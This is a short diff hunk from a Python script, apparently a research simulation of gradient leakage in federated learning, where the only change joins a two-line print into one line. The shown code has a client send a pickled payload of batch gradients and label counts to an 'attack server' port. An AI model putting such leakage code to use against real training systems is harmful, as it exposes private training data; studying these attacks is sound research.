@@ -110,8 +110,7 @@ def main():
                     atk.connect((args.host, args.port + 1)) # connect to the attack server port
                     send_pkl(atk, payload)
                     atk.close()
-                    print(f"[client] LEAKED batch-gradients: B={LEAK_BATCH_SIZE} "
-                          f"| label_counts={label_counts} | round={round_idx}", flush=True)
+                    print(f"[client] LEAKED batch-gradients: B={LEAK_BATCH_SIZE} | label_counts={label_counts} | round={round_idx}", flush=True)
                 except Exception as e:
                     print(f"[client] Leak failed: {e}", flush=True)
                 finally:
